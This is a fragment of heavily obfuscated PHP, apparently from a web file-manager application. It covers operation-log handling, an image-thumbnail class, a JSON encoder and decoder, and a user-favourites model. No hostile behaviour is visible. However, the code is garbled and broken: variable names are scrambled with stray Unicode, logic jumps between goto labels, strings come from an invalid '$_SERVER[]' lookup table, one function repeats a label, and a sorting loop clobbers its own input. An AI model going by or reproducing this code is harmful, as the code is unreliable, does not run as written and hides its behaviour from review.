$aȇ[$e橚[2247]] = $Eٌ[$e橚[457]]; break; } return $aȇ; } private function getSourceList(&$D⛪͐) { $Cݼ =& $_SERVER[]; $bՊ = array(); foreach ($D⛪͐ as $d => $c) { goto d頙; a: $bՊ[] = $A[$Cݼ[365]]; $bՊ[] = $A[$Cݼ[2247]]; if ($A[$Cݼ[29]] == $Cݼ[488]) { $bՊ[] = $A[$Cݼ[401]][$Cݼ[993]]; $bՊ[] = $A[$Cݼ[401]][$Cݼ[994]]; } goto eֺ; eֺ: if ($A[$Cݼ[29]] == $Cݼ[2255]) { $bՊ[] = $A[$Cݼ[401]][$Cݼ[365]]; } goto D; d頙: $A = json_decode($c[$Cݼ[401]], !0); if ($c[$Cݼ[29]] == $Cݼ[2040]) { $A = $this->descZipDownload($A, $bՊ); $D⛪͐[$d][$Cݼ[401]] = json_encode($A); continue; } if (strpos($c[$Cݼ[29]], $Cݼ[2248]) !== 0) { goto aƯݏΊ; Cͽ܍: $bՊ[] = $A[$Cݼ[365]] = $d色[$Cݼ[365]]; $bՊ[] = $A[$Cݼ[2247]] = $d色[$Cݼ[457]]; $D⛪͐[$d][$Cݼ[401]] = json_encode($A); goto a; a: continue; goto e; aƯݏΊ: if (!isset($A[$Cݼ[75]]) || strpos($c[$Cݼ[29]], $Cݼ[2433]) !== 0) { continue; } if (!IO::init($A[$Cݼ[75]])) { continue; } if (!($d色 = IO::infoFull($A[$Cݼ[75]]))) { continue; } goto Cͽ܍; e: } goto a; D: } if (!$bՊ) { return array(); } return Model($Cݼ[738])->sourceListInfo($bՊ, !0); } private function logList($f޾Ʈ) { goto Fل; dч: $aα = $this->getSourceList($f޾Ʈ); $bӾ = $this->typeAll(); $Cα = array(); goto AŤ㦮; Fل: $F٬ =& $_SERVER[]; $B߯ = array_to_keyvalue($f޾Ʈ, $F٬[33], $F٬[1406]); $Dق̽ = Model($F٬[473])->userListInfo(array_unique($B߯)); goto dч; b: return $Cα; goto B; AŤ㦮: $Eӳݝ = array(); foreach ($f޾Ʈ as $c => $d) { goto f; f: $eᒾ = $d[$F٬[29]]; $dѸ = isset($Dق̽[$d[$F٬[1406]]]) ? $Dق̽[$d[$F٬[1406]]] : !1; $a = strpos($eᒾ, $F٬[2434]) === 0 ? LNG($F٬[2435]) : LNG($F٬[2430]); goto cע; Cϴ: unset($d[$F٬[2436]]); $Cα[] = $d; goto B눤; F: $this->ipAddress($d); if (strpos($eᒾ, $F٬[2248]) === 0 || isset($d髒[$F٬[2247]])) { goto b; b: $d髒[$F٬[387]] = $aα[$d髒[$F٬[365]]]; $d髒[$F٬[2260]] = $aα[$d髒[$F٬[2247]]]; if ($d髒[$F٬[29]] == $F٬[488]) { $d髒[$F٬[401]][$F٬[993]] = $aα[$d髒[$F٬[401]][$F٬[993]]]; $d髒[$F٬[401]][$F٬[994]] = $aα[$d髒[$F٬[401]][$F٬[994]]]; } goto dɴ; dɴ: if ($d髒[$F٬[29]] == $F٬[2255]) { $d髒[$F٬[401]][$F٬[365]] = $aα[$d髒[$F٬[401]][$F٬[365]]]; } if ($d髒[$F٬[29]] == $F٬[2035]) { $d髒[$F٬[2260]] = $d髒[$F٬[387]]; $d髒[$F٬[2247]] = $d髒[$F٬[2260]][$F٬[365]]; $d髒[$F٬[387]] = !1; $d髒[$F٬[365]] = $F٬[33]; } if ($d髒[$F٬[387]] && $d髒[$F٬[387]][$F٬[367]] == $F٬[1067]) { $Eӳݝ[] = $d[$F٬[363]]; unset($f޾Ʈ[$c]); continue; } goto bӪѯ; bӪѯ: if ($d髒[$F٬[2260]] && $d髒[$F٬[2260]][$F٬[367]] == $F٬[1067]) { $Eӳݝ[] = $d[$F٬[363]]; unset($f޾Ʈ[$c]); continue; } goto fы; fы: } $d[$F٬[401]] = $d髒; goto Cϴ; cע: $d[$F٬[28]] = isset($dѸ[$F٬[28]]) ? $dѸ[$F٬[28]] : LNG($F٬[2430]); $d[$F٬[2295]] = isset($dѸ[$F٬[2295]]) ? $dѸ[$F٬[2295]] : $F٬[33]; $d[$F٬[1313]] = isset($bӾ[$eᒾ]) ? $bӾ[$eᒾ] : $a; goto Fҩ; Fҩ: $d[$F٬[2205]] = $dѸ; $d髒 = json_decode($d[$F٬[401]], !0); $d[$F٬[2427]] = isset($d髒[$F٬[2427]]) ? $d髒[$F٬[2427]] : $F٬[33]; goto F; B눤: } $this->clearSystemPathLog($Eӳݝ); goto b; B: } private function clearSystemPathLog($cߦ) { $b =& $_SERVER[]; if (count($cߦ) == 0) { return; } $A߭ԕ = array($b[363] => array($b[7], array_unique($cߦ))); $this->where($A߭ԕ)->delete(); } public function deviceList($D󅹯ɿ, $b = 0) { $F߅ =& $_SERVER[]; $Bſڛ = array($F߅[1406] => $D󅹯ɿ, $F߅[183] => array($F߅[914], $b), $F߅[29] => $F߅[2008]); $d = array(); $Fԗ = $this->field($F߅[2437])->where($Bſڛ)->order($F߅[2258])->limit(50)->select(); foreach ($Fԗ as $fߺ˂ => $b) { goto f̼; b΍: $this->ipAddress($b); $b[$F߅[401]] = $C㒊; $d[$dը訅] = $b; goto fϰ; f̼: if ($fߺ˂ > 0 && abs($b[$F߅[183]] - $Fԗ[$fߺ˂ - 1][$F߅[183]]) < 5) { continue; } $C㒊 = json_decode($b[$F߅[401]], !0); $b[$F߅[2427]] = isset($C㒊[$F߅[2427]]) ? $C㒊[$F߅[2427]] : $F߅[33]; goto dɐ֘; dɐ֘: unset($C㒊[$F߅[2427]]); $dը訅 = $this->deviceType($C㒊[$F߅[2249]]); if (isset($d[$dը訅])) { continue; } goto b΍; fϰ: } return array_values($d); } public function deviceType($D؆) { return $D؆; } } goto Eϛ; B: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($cд, $f) { goto a; f񝣵: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto AŹ; a: $this->srcFile = $cд; $this->echoType = $f; $this->im = self::image($cд); goto e; e: if (!$this->im) { return !1; } $Dн = $_SERVER[][33]; $this->imgData = GetImageSize($cд, $Dн); goto f񝣵; AŹ: } public static function image($A͊) { $c =& $_SERVER[]; $A욵 = $c[33]; $a⨱ = GetImageSize($A͊, $A욵); $cա = !1; switch ($a⨱[2]) { case IMAGETYPE_GIF: if (!function_exists($c[1828])) { break; } $cա = imagecreatefromgif($A͊); break; case IMAGETYPE_JPEG: if (!function_exists($c[1829])) { break; } $cա = imagecreatefromjpeg($A͊); break; case IMAGETYPE_PNG: if (!function_exists($c[1830])) { break; } $cա = @imagecreatefrompng($A͊); imagesavealpha($cա, !0); break; case IMAGETYPE_XBM: $cա = imagecreatefromxbm($A͊); break; case IMAGETYPE_WBMP: $cա = imagecreatefromwbmp($A͊); break; case IMAGETYPE_BMP: $cա = imagecreatefrombmp($A͊); break; default: break; } return $cա; } public static function imageSize($cۦ) { $eŕ =& $_SERVER[]; $F = GetImageSize($cۦ); if (!$F) { return !1; } return array($eŕ[1831] => $F[0], $eŕ[1832] => $F[1]); } function distortion($f, $Bү᩠, $E壭) { $Aؼ = $this->creatImage($this->im, $Bү᩠, $E壭, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Aؼ, $f); } function prorate($e̺ޟ, $A, $Bٚ) { $Aݷ = $A / $Bٚ; $F = $this->srcW / $this->srcH; if ($Aݷ <= $F) { $bŒ = $A; $D = $bŒ * ($this->srcH / $this->srcW); } else { $D = $Bٚ; $bŒ = $D * ($this->srcW / $this->srcH); } if ($this->srcW > $A || $this->srcH > $Bٚ) { $e = $this->creatImage($this->im, $bŒ, $D, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e, $e̺ޟ); } else { $e = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($e, $e̺ޟ); } } function cut($C, $f️, $e쮊) { goto E撨ׯ; a寮: return $this->echoImage($B, $C); goto DɈ; E撨ׯ: $f繪 = $f️ / $e쮊; $Bʪ = $this->srcW / $this->srcH; if ($f繪 <= $Bʪ) { $BГ܍ = $e쮊; $Dʗ = $BГ܍ * ($this->srcW / $this->srcH); } else { $Dʗ = $f️; $BГ܍ = $Dʗ * ($this->srcH / $this->srcW); } goto FȌʲ; FȌʲ: $a̢ = $this->creatImage($this->im, $Dʗ, $BГ܍, 0, 0, 0, 0, $this->srcW, $this->srcH); $B = $this->creatImage($a̢, $f️, $e쮊, 0, 0, ($Dʗ - $f️) / 2, ($BГ܍ - $e쮊) / 2, $f️, $e쮊); imageDestroy($a̢); goto a寮; DɈ: } function backFill($E۠, $dܕ, $EݷƝ, $Bқ = false, $C܆؟ = 255, $c = 255, $Cώ = 255) { goto aكɱ; aكɱ: $a숪Ѿ = $dܕ / $EݷƝ; $Eׇ = $this->srcW / $this->srcH; if ($a숪Ѿ <= $Eׇ) { $Aᄱۚ = $dܕ; $E = $Aᄱۚ * ($this->srcH / $this->srcW); } else { $E = $EݷƝ; $Aᄱۚ = $E * ($this->srcW / $this->srcH); } goto d۩; eٙ: return $this->echoImage($aӄ, $E۠); goto Cǔݾ; d۩: if (function_exists($_SERVER[][1833])) { @($aӄ = imageCreateTrueColor($dܕ, $EݷƝ)); if (!$aӄ) { $aӄ = imageCreate($dܕ, $EݷƝ); } } else { $aӄ = imageCreate($dܕ, $EݷƝ); } $Cȯ = ($EݷƝ - $E) / 2; $bȵ = imagecolorallocate($aӄ, $C܆؟, $c, $Cώ); goto AΞݡ; AΞݡ: if ($Bқ) { $bȵ = imageColorTransparent($aӄ, $bȵ); $Cȯ = $EݷƝ - $E; } imageFilledRectangle($aӄ, 0, 0, $dܕ, $EݷƝ, $bȵ); if ($this->srcW > $dܕ || $this->srcH > $EݷƝ) { $aզ = $this->creatImage($this->im, $Aᄱۚ, $E, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($Aᄱۚ < $dܕ) { imageCopy($aӄ, $aզ, ($dܕ - $Aᄱۚ) / 2, 0, 0, 0, $Aᄱۚ, $E); } else { if ($E < $EݷƝ) { imageCopy($aӄ, $aզ, 0, $Cȯ, 0, 0, $Aᄱۚ, $E); } else { imageCopy($aӄ, $aզ, 0, 0, 0, 0, $Aᄱۚ, $E); } } } else { imageCopyMerge($aӄ, $this->im, ($dܕ - $Aᄱۚ) / 2, $Cȯ, 0, 0, $Aᄱۚ, $E, 100); } goto eٙ; Cǔݾ: } function creatImage($dª儑, $a, $C, $dܰ, $Bٍ, $A綆, $D赧, $c񭒪ݱ, $e) { if (function_exists($_SERVER[][1833])) { @($aؽ = ImageCreateTrueColor($a, $C)); @imagealphablending($aؽ, !1); @imagesavealpha($aؽ, !0); if ($aؽ) { imageCopyResampled($aؽ, $dª儑, $dܰ, $Bٍ, $A綆, $D赧, $a, $C, $c񭒪ݱ, $e); } else { $aؽ = ImageCreate($a, $C); imageCopyResized($aؽ, $dª儑, $dܰ, $Bٍ, $A綆, $D赧, $a, $C, $c񭒪ݱ, $e); } } else { $aؽ = ImageCreate($a, $C); imageCopyResized($aؽ, $dª儑, $dܰ, $Bٍ, $A綆, $D赧, $a, $C, $c񭒪ݱ, $e); } return $aؽ; } public function imgRotate($f, $f诛) { goto d; d: return $a; goto f㨸Ɲ; d: if (!$this->im || $f诛 % 360 === 0 || !function_exists($_SERVER[][1834])) { return !1; } $C = imageRotate($this->im, 360 - $f诛, 0); $a = !1; goto C; C: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $a = imagegif($C, $f); break; case IMAGETYPE_JPEG: $a = imagejpeg($C, $f, 100); break; case IMAGETYPE_PNG: $a = imagePNG($C, $f); break; default: break; } imageDestroy($C); imageDestroy($this->im); goto d; f㨸Ɲ: } function echoImage($d노ܶ, $Fı) { goto CݫՂ; f䳌: imageDestroy($this->im); return $b; goto F; CݫՂ: $fэ =& $_SERVER[]; if (!$d노ܶ) { return !1; } ob_get_clean(); goto fȟ; fȟ: $b = !1; switch ($this->echoType) { case $fэ[1835]: $b = imagePNG($d노ܶ); break; case $fэ[163]: $b = imagePNG($d노ܶ, $Fı); break; } imageDestroy($d노ܶ); goto f䳌; F: } } if (!function_exists($_SERVER[][1836])) { define($_SERVER[][1837], 0); define($_SERVER[][1838], 1); define($_SERVER[][1839], 2); function imageflip($fզ, $Eܜ) { switch ($Eܜ) { case IMG_FLIP_HORIZONTAL: $c׌ = imagesx($fզ) - 1; $cۦ = $c׌ / 2; $eŝ = imagesy($fզ); $bŃ = imageistruecolor($fզ) ? imagecreatetruecolor(1, $eŝ) : imagecreate(1, $eŝ); for ($dά = 0; $dά < $cۦ; ++$dά) { imagecopy($bŃ, $fզ, 0, 0, $dά, 0, 1, $eŝ); imagecopy($fզ, $fզ, $dά, 0, $c׌ - $dά, 0, 1, $eŝ); imagecopy($fզ, $bŃ, $c׌ - $dά, 0, 0, 0, 1, $eŝ); } break; case IMG_FLIP_VERTICAL: $Dΐ = imagesx($fզ); $eߒ = imagesy($fզ) - 1; $f۴ = $eߒ / 2; $bŃ = imageistruecolor($fզ) ? imagecreatetruecolor($Dΐ, 1) : imagecreate($Dΐ, 1); for ($d뷪 = 0; $d뷪 < $f۴; ++$d뷪) { imagecopy($bŃ, $fզ, 0, 0, 0, $d뷪, $Dΐ, 1); imagecopy($fզ, $fզ, 0, $d뷪, 0, $eߒ - $d뷪, $Dΐ, 1); imagecopy($fզ, $bŃ, 0, $eߒ - $d뷪, 0, 0, $Dΐ, 1); } break; case IMG_FLIP_BOTH: $Dΐ = imagesx($fզ); $eŝ = imagesy($fզ); $bŃ = imagerotate($fզ, 180, 0); imagecopy($fզ, $bŃ, 0, 0, 0, 0, $Dΐ, $eŝ); break; default: return; } imagedestroy($bŃ); } } if (!function_exists($_SERVER[][1840])) { function imagecreatefrombmp($d񼬆) { return ImageGdBMP::load($d񼬆); } } goto dՉ; F: define($_SERVER[][1902], 32); class Services_JSON { function __construct($C͌͛ = 0) { $this->use = $C͌͛; } function utf162utf8($E𰣘) { $cƾ =& $_SERVER[]; if (function_exists($cƾ[68])) { return mb_convert_encoding($E𰣘, $cƾ[1554], $cƾ[1903]); } $Cߏԅ = ord($E𰣘[0]) << 8 | ord($E𰣘[1]); switch (!0) { case (127 & $Cߏԅ) == $Cߏԅ: return chr(127 & $Cߏԅ); case (2047 & $Cߏԅ) == $Cߏԅ: return chr(192 | $Cߏԅ >> 6 & 31) . chr(128 | $Cߏԅ & 63); case (65535 & $Cߏԅ) == $Cߏԅ: return chr(224 | $Cߏԅ >> 12 & 15) . chr(128 | $Cߏԅ >> 6 & 63) . chr(128 | $Cߏԅ & 63); } return $cƾ[33]; } function utf82utf16($eĆ) { $a =& $_SERVER[]; if (function_exists($a[68])) { return mb_convert_encoding($eĆ, $a[1903], $a[1554]); } switch (strlen($eĆ)) { case 1: return $eĆ; case 2: return chr(7 & ord($eĆ[0]) >> 2) . chr(192 & ord($eĆ[0]) << 6 | 63 & ord($eĆ[1])); case 3: return chr(240 & ord($eĆ[0]) << 4 | 15 & ord($eĆ[1]) >> 2) . chr(192 & ord($eĆ[1]) << 6 | 127 & ord($eĆ[2])); } return $a[33]; } function encode($cߔ) { $f =& $_SERVER[]; switch (gettype($cߔ)) { case $f[1565]: return $cߔ ? $f[1564] : $f[1566]; case $f[1904]: return $f[99]; case $f[299]: return (int) $cߔ; case $f[274]: case $f[273]: return (double) $cߔ; case $f[308]: $fݝ = $f[33]; $c = strlen($cߔ); for ($Dϲ = 0; $Dϲ < $c; ++$Dϲ) { $c׸ = ord($cߔ[$Dϲ]); switch (!0) { case $c׸ == 8: $fݝ .= $f[1905]; break; case $c׸ == 9: $fݝ .= $f[1541]; break; case $c׸ == 10: $fݝ .= $f[1539]; break; case $c׸ == 12: $fݝ .= $f[1906]; break; case $c׸ == 13: $fݝ .= $f[1540]; break; case $c׸ == 34: case $c׸ == 47: case $c׸ == 92: $fݝ .= $f[93] . $cߔ[$Dϲ]; break; case $c׸ >= 32 && $c׸ <= 127: $fݝ .= $cߔ[$Dϲ]; break; case ($c׸ & 224) == 192: $b = pack($f[1907], $c׸, ord($cߔ[$Dϲ + 1])); $Dϲ += 1; $CĞɿ = $this->utf82utf16($b); $fݝ .= sprintf($f[1908], bin2hex($CĞɿ)); break; case ($c׸ & 240) == 224: $b = pack($f[1907], $c׸, ord($cߔ[$Dϲ + 1]), ord($cߔ[$Dϲ + 2])); $Dϲ += 2; $CĞɿ = $this->utf82utf16($b); $fݝ .= sprintf($f[1908], bin2hex($CĞɿ)); break; case ($c׸ & 248) == 240: $b = pack($f[1907], $c׸, ord($cߔ[$Dϲ + 1]), ord($cߔ[$Dϲ + 2]), ord($cߔ[$Dϲ + 3])); $Dϲ += 3; $CĞɿ = $this->utf82utf16($b); $fݝ .= sprintf($f[1908], bin2hex($CĞɿ)); break; case ($c׸ & 252) == 248: $b = pack($f[1907], $c׸, ord($cߔ[$Dϲ + 1]), ord($cߔ[$Dϲ + 2]), ord($cߔ[$Dϲ + 3]), ord($cߔ[$Dϲ + 4])); $Dϲ += 4; $CĞɿ = $this->utf82utf16($b); $fݝ .= sprintf($f[1908], bin2hex($CĞɿ)); break; case ($c׸ & 254) == 252: $b = pack($f[1907], $c׸, ord($cߔ[$Dϲ + 1]), ord($cߔ[$Dϲ + 2]), ord($cߔ[$Dϲ + 3]), ord($cߔ[$Dϲ + 4]), ord($cߔ[$Dϲ + 5])); $Dϲ += 5; $CĞɿ = $this->utf82utf16($b); $fݝ .= sprintf($f[1908], bin2hex($CĞɿ)); break; } } return $f[112] . $fݝ . $f[112]; case $f[1909]: if (is_array($cߔ) && count($cߔ) && array_keys($cߔ) !== range(0, sizeof($cߔ) - 1)) { $Fɇ = array_map(array($this, $f[1910]), array_keys($cߔ), array_values($cߔ)); foreach ($Fɇ as $d燬) { if (Services_JSON::isError($d燬)) { return $d燬; } } return $f[1055] . join($f[47], $Fɇ) . $f[311]; } $E˗ = array_map(array($this, $f[1911]), $cߔ); foreach ($E˗ as $c) { if (Services_JSON::isError($c)) { return $c; } } return $f[153] . join($f[47], $E˗) . $f[472]; case $f[1912]: $cǄ = get_object_vars($cߔ); $Fɇ = array_map(array($this, $f[1910]), array_keys($cǄ), array_values($cǄ)); foreach ($Fɇ as $d燬) { if (Services_JSON::isError($d燬)) { return $d燬; } } return $f[1055] . join($f[47], $Fɇ) . $f[311]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $f[99] : new Services_JSON_Error(gettype($cߔ) . $f[1913]); } } function name_value($aє, $f׋) { $EѢ = $this->encode($f׋); if (Services_JSON::isError($EѢ)) { return $EѢ; } return $this->encode(strval($aє)) . $_SERVER[][4] . $EѢ; } function reduce_string($b) { $C =& $_SERVER[]; $b = preg_replace(array($C[1914], $C[1915], $C[1916]), $C[33], $b); return trim($b); } function decode($d) { $Bˋ =& $_SERVER[]; $d = $this->reduce_string($d); switch (strtolower($d)) { case $Bˋ[1564]: return !0; case $Bˋ[1566]: return !1; case $Bˋ[99]: return null; default: $b = array(); if (is_numeric($d)) { return (double) $d == (int) $d ? (int) $d : (double) $d; } elseif (preg_match($Bˋ[1917], $d, $b) && $b[1] == $b[2]) { $eφ = substr($d, 0, 1); $c׍м = substr($d, 1, -1); $aƑ = $Bˋ[33]; $cǇ = strlen($c׍м); for ($Fԑ = 0; $Fԑ < $cǇ; ++$Fԑ) { $eɽɋ = substr($c׍м, $Fԑ, 2); $Eߵ = ord($c׍м[$Fԑ]); switch (!0) { case $eɽɋ == $Bˋ[1905]: $aƑ .= chr(8); ++$Fԑ; break; case $eɽɋ == $Bˋ[1541]: $aƑ .= chr(9); ++$Fԑ; break; case $eɽɋ == $Bˋ[1539]: $aƑ .= chr(10); ++$Fԑ; break; case $eɽɋ == $Bˋ[1906]: $aƑ .= chr(12); ++$Fԑ; break; case $eɽɋ == $Bˋ[1540]: $aƑ .= chr(13); ++$Fԑ; break; case $eɽɋ == $Bˋ[1325]: case $eɽɋ == $Bˋ[1918]: case $eɽɋ == $Bˋ[1534]: case $eɽɋ == $Bˋ[1536]: if ($eφ == $Bˋ[112] && $eɽɋ != $Bˋ[1918] || $eφ == $Bˋ[55] && $eɽɋ != $Bˋ[1325]) { $aƑ .= $c׍м[++$Fԑ]; } break; case preg_match($Bˋ[1919], substr($c׍м, $Fԑ, 6)): $Bմ檹 = chr(hexdec(substr($c׍м, $Fԑ + 2, 2))) . chr(hexdec(substr($c׍м, $Fԑ + 4, 2))); $aƑ .= $this->utf162utf8($Bմ檹); $Fԑ += 5; break; case $Eߵ >= 32 && $Eߵ <= 127: $aƑ .= $c׍м[$Fԑ]; break; case ($Eߵ & 224) == 192: $aƑ .= substr($c׍м, $Fԑ, 2); ++$Fԑ; break; case ($Eߵ & 240) == 224: $aƑ .= substr($c׍м, $Fԑ, 3); $Fԑ += 2; break; case ($Eߵ & 248) == 240: $aƑ .= substr($c׍м, $Fԑ, 4); $Fԑ += 3; break; case ($Eߵ & 252) == 248: $aƑ .= substr($c׍м, $Fԑ, 5); $Fԑ += 4; break; case ($Eߵ & 254) == 252: $aƑ .= substr($c׍м, $Fԑ, 6); $Fԑ += 5; break; } } return $aƑ; } elseif (preg_match($Bˋ[1920], $d) || preg_match($Bˋ[1921], $d)) { goto a팎; BƋⱓ: $c׍м = $this->reduce_string($c׍м); if ($c׍м == $Bˋ[33]) { if (reset($a̅) == SERVICES_JSON_IN_ARR) { return $aܱ; } else { return $EЫ֥; } } $cǇ = strlen($c׍м); goto e裖; a팎: if ($d[0] == $Bˋ[153]) { $a̅ = array(SERVICES_JSON_IN_ARR); $aܱ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a̅ = array(SERVICES_JSON_IN_OBJ); $EЫ֥ = array(); } else { $a̅ = array(SERVICES_JSON_IN_OBJ); $EЫ֥ = new stdClass(); } } array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_SLICE, $Bˋ[259] => 0, $Bˋ[1923] => !1)); $c׍м = substr($d, 1, -1); goto BƋⱓ; e裖: for ($Fԑ = 0; $Fԑ <= $cǇ; ++$Fԑ) { $Dʩ = end($a̅); $eɽɋ = substr($c׍м, $Fԑ, 2); if ($Fԑ == $cǇ || $c׍м[$Fԑ] == $Bˋ[47] && $Dʩ[$Bˋ[1922]] == SERVICES_JSON_SLICE) { $Dլ = substr($c׍м, $Dʩ[$Bˋ[259]], $Fԑ - $Dʩ[$Bˋ[259]]); array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_SLICE, $Bˋ[259] => $Fԑ + 1, $Bˋ[1923] => !1)); if (reset($a̅) == SERVICES_JSON_IN_ARR) { array_push($aܱ, $this->decode($Dլ)); } elseif (reset($a̅) == SERVICES_JSON_IN_OBJ) { $f = array(); if (preg_match($Bˋ[1924], $Dլ, $f)) { $a = $this->decode($f[1]); $Dͽ½ = $this->decode($f[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $EЫ֥[$a] = $Dͽ½; } else { $EЫ֥->{$a} = $Dͽ½; } } elseif (preg_match($Bˋ[1925], $Dլ, $f)) { $a = $f[1]; $Dͽ½ = $this->decode($f[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $EЫ֥[$a] = $Dͽ½; } else { $EЫ֥->{$a} = $Dͽ½; } } } } elseif (($c׍м[$Fԑ] == $Bˋ[112] || $c׍м[$Fԑ] == $Bˋ[55]) && $Dʩ[$Bˋ[1922]] != SERVICES_JSON_IN_STR) { array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_IN_STR, $Bˋ[259] => $Fԑ, $Bˋ[1923] => $c׍м[$Fԑ])); } elseif ($c׍м[$Fԑ] == $Dʩ[$Bˋ[1923]] && $Dʩ[$Bˋ[1922]] == SERVICES_JSON_IN_STR && (strlen(substr($c׍м, 0, $Fԑ)) - strlen(rtrim(substr($c׍м, 0, $Fԑ), $Bˋ[93]))) % 2 != 1) { array_pop($a̅); } elseif ($c׍м[$Fԑ] == $Bˋ[153] && in_array($Dʩ[$Bˋ[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_IN_ARR, $Bˋ[259] => $Fԑ, $Bˋ[1923] => !1)); } elseif ($c׍м[$Fԑ] == $Bˋ[472] && $Dʩ[$Bˋ[1922]] == SERVICES_JSON_IN_ARR) { array_pop($a̅); } elseif ($c׍м[$Fԑ] == $Bˋ[1055] && in_array($Dʩ[$Bˋ[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_IN_OBJ, $Bˋ[259] => $Fԑ, $Bˋ[1923] => !1)); } elseif ($c׍м[$Fԑ] == $Bˋ[311] && $Dʩ[$Bˋ[1922]] == SERVICES_JSON_IN_OBJ) { array_pop($a̅); } elseif ($eɽɋ == $Bˋ[1926] && in_array($Dʩ[$Bˋ[1922]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($a̅, array($Bˋ[1922] => SERVICES_JSON_IN_CMT, $Bˋ[259] => $Fԑ, $Bˋ[1923] => !1)); $Fԑ++; } elseif ($eɽɋ == $Bˋ[1927] && $Dʩ[$Bˋ[1922]] == SERVICES_JSON_IN_CMT) { array_pop($a̅); $Fԑ++; for ($b = $Dʩ[$Bˋ[259]]; $b <= $Fԑ; ++$b) { $c׍м = substr_replace($c׍м, $Bˋ[50], $b, 1); } } } if (reset($a̅) == SERVICES_JSON_IN_ARR) { return $aܱ; } elseif (reset($a̅) == SERVICES_JSON_IN_OBJ) { return $EЫ֥; } goto Fֈ; Fֈ: } } } function isError($eգ, $bאΙ = null) { $c =& $_SERVER[]; if (class_exists($c[1928])) { return PEAR::isError($eգ, $bאΙ); } elseif (is_object($eգ) && (get_class($eգ) == $c[1929] || is_subclass_of($eգ, $c[1929]))) { return !0; } return !1; } } if (class_exists($_SERVER[][1930])) { class Services_JSON_Error extends PEAR_Error { function __construct($dَ = "\165\156\153\156\x6f\167\x6e\x20\x65\162\x72\x6f\x72", $eŵ = null, $b = null, $eĢ䝝 = null, $F̈́ = null) { parent::PEAR_Error($dَ, $eŵ, $b, $eĢ䝝, $F̈́); } } } else { class Services_JSON_Error { function __construct($c = "\165\x6e\x6b\156\x6f\167\156\x20\x65\162\x72\x6f\x72", $D = null, $c = null, $Eэ = null, $D = null) { } } } goto D; AÏ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($c뫚) { $EǨ =& $_SERVER[]; return array($EǨ[2450] => array(USER_ID, $EǨ[2451])); } protected function listData() { $b񟴐 =& $_SERVER[]; $cԿ = array($b񟴐[1397] => USER_ID, $b񟴐[432] => 0); $e = $b񟴐[2452]; $E = $this->field($e)->where($cԿ)->order($b񟴐[2453])->select(); return $E ? $E : array(); } protected function resetCache() { } protected function listView() { goto Cґ; Cґ: $fȂԫ =& $_SERVER[]; $bݩ = $this->listData(); $b = array_filter_by_field($bݩ, $fȂԫ[29], $fȂԫ[378]); goto E՘; E: $Aؘ = array_to_keyvalue($Aؘ, $fȂԫ[365]); foreach ($bݩ as $eۅ => $e) { $b٢ = $Aؘ[$e[$fȂԫ[75]]]; $b٢ = $b٢ ? $b٢ : array(); $bݩ[$eۅ] = array_merge($b٢, $e); } return $bݩ; goto f̶; E՘: $f虨 = array_to_keyvalue($b, $fȂԫ[33], $fȂԫ[75]); if (!$f虨) { return $bݩ; } $B = 2000; goto A޴̳; A޴̳: $EҏǸ = array($fȂԫ[379] => array($fȂԫ[380], $f虨)); $Aؘ = Model($fȂԫ[738])->listSource($EҏǸ, $B); $Aؘ = array_merge($Aؘ[$fȂԫ[73]], $Aؘ[$fȂԫ[74]]); goto E; f̶: } protected function addFav($f, $Cְܑ = '', $a覟 = "\163\157\x75\x72\143\145") { goto a߭; F: $e˂ = array($eג[1397] => USER_ID, $eג[432] => 0); $D͏ = $this->where($e˂)->max($eג[2089]); if (!$D͏) { $D͏ = 0; } goto bѷ; a߭: $eג =& $_SERVER[]; $e˂ = array($eג[1397] => USER_ID, $eג[432] => 0, $eג[384] => $a覟, $eג[383] => $f); if ($this->where($e˂)->find()) { return !1; } goto F; aӍ: return $this->add($D); goto Eљ; bѷ: if (!$Cְܑ && $a覟 == $eג[378]) { $AҴ = Model($eג[1097])->where(array($eג[379] => $f))->find(); if (!$AҴ) { return !1; } $Cְܑ = $AҴ[$eג[28]]; } $Cְܑ = $this->getAutoName($Cְܑ); $D = array($eג[1397] => USER_ID, $eג[432] => 0, $eג[382] => $Cְܑ, $eג[383] => $f, $eג[384] => $a覟, $eג[2072] => $D͏ + 1); goto aӍ; Eљ: } protected function remove($Aο֒) { $cת =& $_SERVER[]; $a = array($cת[1397] => USER_ID, $cת[381] => $Aο֒); return $this->where($a)->delete(); } protected function removeByName($F) { $B =& $_SERVER[]; $bΝ = array($B[1397] => USER_ID, $B[382] => $F, $B[432] => 0); return $this->where($bΝ)->delete(); } protected function rename($a銎, $b) { $AҏⓂ =& $_SERVER[]; if ($a銎 == $b) { return !1; } $b̧͑ = $this->getAutoName($b); if ($b != $b̧͑) { return !1; } $F󫈂 = array($AҏⓂ[1397] => USER_ID, $AҏⓂ[432] => 0, $AҏⓂ[28] => $a銎); return $this->where($F󫈂)->save(array($AҏⓂ[28] => $b)); } protected function resetSort($E) { $C =& $_SERVER[]; $E = is_array($E) ? $E : array(); $e = array($C[1397] => USER_ID); for ($E = 0; $E < count($E); $E++) { $e[$C[381]] = $E[$E]; $this->where($e)->save(array($C[2072] => $E + 1)); } return !0; } 